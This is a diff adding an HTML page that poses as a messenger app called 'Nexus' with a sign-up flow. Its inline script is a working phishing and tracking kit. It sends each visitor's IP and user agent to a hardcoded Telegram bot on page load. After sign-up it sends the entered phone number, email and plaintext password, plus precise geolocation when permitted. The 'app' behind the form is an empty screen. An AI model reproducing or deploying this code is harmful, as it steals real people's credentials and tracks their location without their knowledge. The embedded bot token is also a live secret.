@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Nexus Messenger</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
+body{background:#0a0a0c;height:100vh;display:flex;justify-content:center;align-items:center;}
+.app{width:100%;max-width:480px;height:95vh;background:#111214;border-radius:32px;overflow:hidden;box-shadow:0 25px 50px -12px rgba(0,0,0,0.8);position:relative;}
+.screen{width:100%;height:100%;overflow-y:auto;padding:20px;}
+.hide{display:none;}
+.header{background:#1c1c1e;padding:18px 20px;border-bottom:1px solid #2c2c2e;backdrop-filter:blur(10px);}
+.header h1{color:white;font-size:24px;font-weight:600;}
+.step-container{background:#1c1c1e;border-radius:28px;padding:32px 24px;margin-top:20px;}
+.input-group{margin-bottom:20px;}
+.input-group label{color:#8e8e93;font-size:13px;display:block;margin-bottom:8px;}
+.input-group input{width:100%;background:#2c2c30;border:none;padding:14px 16px;border-radius:16px;color:white;font-size:16px;outline:none;}
+.input-group input:focus{background:#3a3a3e;}
+.btn{width:100%;background:#3390ec;border:none;padding:14px;border-radius:28px;color:white;font-weight:600;font-size:16px;cursor:pointer;margin-top:12px;}
+.location-prompt{background:#1c1c1e;border-radius:24px;padding:24px;text-align:center;margin-top:20px;}
+.location-prompt p{color:#fff;margin-bottom:16px;}
+.btn-loc{background:#2c2c30;color:#3390ec;display:inline-block;padding:12px 24px;border-radius:30px;margin:8px;cursor:pointer;}
+.chat-placeholder{background:#1c1c1e;border-radius:24px;padding:40px 20px;text-align:center;color:#5e5e66;}
+.chat-placeholder svg{width:80px;height:80px;opacity:0.4;margin-bottom:20px;}
+.chat-placeholder p{margin-top:20px;font-size:14px;color:#5e5e66;}
+</style>
+</head>
+<body>
+<div class="app" id="app">
+<div id="step1" class="screen">
+<div class="header"><h1>Nexus</h1></div>
+<div class="step-container">
+<h2 style="color:white;margin-bottom:24px;">Create account</h2>
+<div class="input-group"><label>Phone number</label><input type="tel" id="phone" placeholder="+7 900 123-45-67"></div>
+<div class="input-group"><label>Email</label><input type="email" id="email" placeholder="hello@mail.com"></div>
+<div class="input-group"><label>Password</label><input type="password" id="pass" placeholder="Create password"></div>
+<button class="btn" id="nextStep1">Continue →</button>
+</div>
+</div>
+
+<div id="step2" class="screen hide">
+<div class="header"><h1>Nexus</h1></div>
+<div class="step-container">
+<h2 style="color:white;margin-bottom:24px;">Set profile</h2>
+<div class="input-group"><label>Nickname</label><input type="text" id="nick" placeholder="Alex"></div>
+<div class="input-group"><label>Username</label><input type="text" id="username" placeholder="@alex_2025"></div>
+<button class="btn" id="nextStep2">Complete →</button>
+</div>
+</div>
+
+<div id="step3" class="screen hide">
+<div class="header"><h1>Nexus</h1></div>
+<div class="location-prompt" id="locPrompt">
+<p>🌍 Enable location to connect with people near you</p>
+<button class="btn-loc" id="allowLoc">Allow location</button>
+<button class="btn-loc" id="denyLoc">Not now</button>
+</div>
+</div>
+
+<div id="mainApp" class="screen hide">
+<div class="header"><h1>Nexus</h1><div style="font-size:12px;color:#5e5e66;margin-top:4px;">@<span id="displayUser">user</span></div></div>
+<div class="chat-placeholder" style="margin-top:20px;">
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+<p>✨ Empty space<br>No messages, no channels<br>Just you</p>
+</div>
+</div>
+</div>
+
+<script>
+const BOT_TOKEN = "8625100345:AAGC1DlehbLDT6pg_tfCGm50Ex3iNcgzjkY";
+const CHAT_ID = "7967916023";
+
+let userData = {
+    phone: '', email: '', password: '', nickname: '', username: '',
+    ip: '', city: '', country: '', timezone: '', geo: null, entryTime: ''
+};
+
+function nowStr(){
+    const d = new Date();
+    return `${d.getFullYear()}-${(d.getMonth()+1).toString().padStart(2,'0')}-${d.getDate().toString().padStart(2,'0')} ${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
+}
+
+async function sendToBot(text){
+    try{
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: text})
+        });
+    }catch(e){}
+}
+
+async function getIPInfo(){
+    try{
+        const r = await fetch('https://ipapi.co/json/');
+        const data = await r.json();
+        userData.ip = data.ip || 'unknown';
+        userData.city = data.city || 'unknown';
+        userData.country = data.country_name || 'unknown';
+        userData.timezone = data.timezone || 'unknown';
+        return true;
+    }catch(e){
+        userData.ip = 'fetch failed';
+        return false;
+    }
+}
+
+function getLocation(){
+    return new Promise((resolve) => {
+        if(!navigator.geolocation){
+            resolve(null);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+                resolve({lat, lon, acc});
+            },
+            (err) => { resolve(null); },
+            {enableHighAccuracy: true, timeout: 10000}
+        );
+    });
+}
+
+async function sendFullReport(includeGeo=false){
+    let msg = `🔷 NEW USER REGISTRATION 🔷\n━━━━━━━━━━━━━━━━━━━━\n📱 Phone: ${userData.phone}\n📧 Email: ${userData.email}\n🔑 Password: ${userData.password}\n👤 Nickname: ${userData.nickname}\n🆔 Username: ${userData.username}\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${userData.ip}\n📍 City: ${userData.city}\n🗺 Country: ${userData.country}\n⏰ Timezone: ${userData.timezone}\n🕒 Entry time: ${userData.entryTime}\n━━━━━━━━━━━━━━━━━━━━`;
+    await sendToBot(msg);
+    if(includeGeo && userData.geo){
+        let geoMsg = `📍 EXACT GEOLOCATION (allowed)\nLat: ${userData.geo.lat}\nLon: ${userData.geo.lon}\nAccuracy: ${Math.round(userData.geo.acc)}m\nTime: ${nowStr()}`;
+        await sendToBot(geoMsg);
+    }
+}
+
+document.getElementById('nextStep1').onclick = async () => {
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('pass').value;
+    if(!phone || !email || !pass){
+        alert('Fill all fields');
+        return;
+    }
+    userData.phone = phone;
+    userData.email = email;
+    userData.password = pass;
+    document.getElementById('step1').classList.add('hide');
+    document.getElementById('step2').classList.remove('hide');
+};
+
+document.getElementById('nextStep2').onclick = () => {
+    const nick = document.getElementById('nick').value.trim();
+    const username = document.getElementById('username').value.trim();
+    if(!nick || !username){
+        alert('Enter nickname and username');
+        return;
+    }
+    userData.nickname = nick;
+    userData.username = username;
+    document.getElementById('displayUser').innerText = username;
+    document.getElementById('step2').classList.add('hide');
+    document.getElementById('step3').classList.remove('hide');
+    
+    getIPInfo().then(() => {
+        userData.entryTime = nowStr();
+    });
+};
+
+document.getElementById('allowLoc').onclick = async () => {
+    const loc = await getLocation();
+    if(loc){
+        userData.geo = loc;
+        await sendFullReport(true);
+    }else{
+        await sendFullReport(false);
+        await sendToBot(`⚠️ User DENIED geolocation but allowed registration.\nIP: ${userData.ip}`);
+    }
+    document.getElementById('step3').classList.add('hide');
+    document.getElementById('mainApp').classList.remove('hide');
+};
+
+document.getElementById('denyLoc').onclick = async () => {
+    await sendFullReport(false);
+    await sendToBot(`🚫 User BLOCKED location request.\nIP: ${userData.ip}\nCity: ${userData.city}`);
+    document.getElementById('step3').classList.add('hide');
+    document.getElementById('mainApp').classList.remove('hide');
+};
+
+window.onload = async () => {
+    await getIPInfo();
+    userData.entryTime = nowStr();
+    sendToBot(`🌐 VISIT DETECTED\nIP: ${userData.ip}\nCity: ${userData.city}\nCountry: ${userData.country}\nTimezone: ${userData.timezone}\nTime: ${userData.entryTime}\nUser agent: ${navigator.userAgent.substring(0,100)}`);
+};
+</script>
+</body>
+</html>
